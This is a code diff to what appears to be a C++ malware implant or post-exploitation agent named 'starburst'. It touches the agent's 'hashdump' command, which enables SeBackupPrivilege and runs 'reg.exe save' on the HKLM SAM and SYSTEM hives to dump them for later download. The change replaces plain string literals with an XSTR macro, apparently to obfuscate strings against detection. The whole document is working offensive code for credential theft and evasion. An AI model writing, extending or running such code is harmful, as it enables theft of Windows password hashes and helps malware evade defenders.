@@ -94,7 +94,7 @@ auto declfn starburst::cmd_hashdump(
             expr::hash_string( "GetTempPathA" ) ) );
     if ( !pGetTempPathA ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "GetTempPathA not found" ) ) );
+            XSTR( "GetTempPathA not found" ) );
         return;
     }
 
@@ -109,18 +109,18 @@ auto declfn starburst::cmd_hashdump(
     DWORD temp_len = pGetTempPathA( 260, temp_dir );
     if ( temp_len == 0 || temp_len > 240 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "GetTempPathA failed" ) ) );
+            XSTR( "GetTempPathA failed" ) );
         return;
     }
 
     // build temp file paths
     char sam_path[280] = { 0 };
     str_copy( sam_path, temp_dir );
-    str_concat( sam_path, symbol<char*>( const_cast<char*>( "s.tmp" ) ) );
+    str_concat( sam_path, XSTR( "s.tmp" ) );
 
     char sys_path[280] = { 0 };
     str_copy( sys_path, temp_dir );
-    str_concat( sys_path, symbol<char*>( const_cast<char*>( "y.tmp" ) ) );
+    str_concat( sys_path, XSTR( "y.tmp" ) );
 
     // enable SeBackupPrivilege for registry save access
     WCHAR backup_priv[] = { 'S','e','B','a','c','k','u','p','P','r','i','v','i','l','e','g','e', 0 };
@@ -132,15 +132,15 @@ auto declfn starburst::cmd_hashdump(
 
     // build command: reg.exe save HKLM\SAM <path> /y
     char cmd_sam[512] = { 0 };
-    str_copy( cmd_sam, symbol<char*>( const_cast<char*>( "reg.exe save HKLM\\SAM " ) ) );
+    str_copy( cmd_sam, XSTR( "reg.exe save HKLM\\SAM " ) );
     str_concat( cmd_sam, sam_path );
-    str_concat( cmd_sam, symbol<char*>( const_cast<char*>( " /y" ) ) );
+    str_concat( cmd_sam, XSTR( " /y" ) );
 
     // build command: reg.exe save HKLM\SYSTEM <path> /y
     char cmd_sys[512] = { 0 };
-    str_copy( cmd_sys, symbol<char*>( const_cast<char*>( "reg.exe save HKLM\\SYSTEM " ) ) );
+    str_copy( cmd_sys, XSTR( "reg.exe save HKLM\\SYSTEM " ) );
     str_concat( cmd_sys, sys_path );
-    str_concat( cmd_sys, symbol<char*>( const_cast<char*>( " /y" ) ) );
+    str_concat( cmd_sys, XSTR( " /y" ) );
 
     // execute SAM save
     bool sam_ok = exec_and_wait( inst, cmd_sam, 15000 );
@@ -148,7 +148,7 @@ auto declfn starburst::cmd_hashdump(
         // cleanup on failure
         if ( pDeleteFileA ) pDeleteFileA( sam_path );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "reg save HKLM\\SAM failed" ) ) );
+            XSTR( "reg save HKLM\\SAM failed" ) );
         return;
     }
 
@@ -161,7 +161,7 @@ auto declfn starburst::cmd_hashdump(
             pDeleteFileA( sys_path );
         }
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "reg save HKLM\\SYSTEM failed" ) ) );
+            XSTR( "reg save HKLM\\SYSTEM failed" ) );
         return;
     }
 
@@ -170,14 +170,13 @@ auto declfn starburst::cmd_hashdump(
     auto output = static_cast<char*>( inst.heap_alloc( out_cap ) );
     if ( !output ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
+            XSTR( "alloc failed" ) );
         return;
     }
 
-    str_copy( output, symbol<char*>( const_cast<char*>(
-        "SAM and SYSTEM hives saved. Use download to retrieve:\nSAM:    " ) ) );
+    str_copy( output, XSTR("SAM and SYSTEM hives saved. Use download to retrieve:\nSAM:    ") );
     str_concat( output, sam_path );
-    str_concat( output, symbol<char*>( const_cast<char*>( "\nSYSTEM: " ) ) );
+    str_concat( output, XSTR( "\nSYSTEM: " ) );
     str_concat( output, sys_path );
 
     queue_response( inst, task_uuid, RESPONSE_SUCCESS, output );
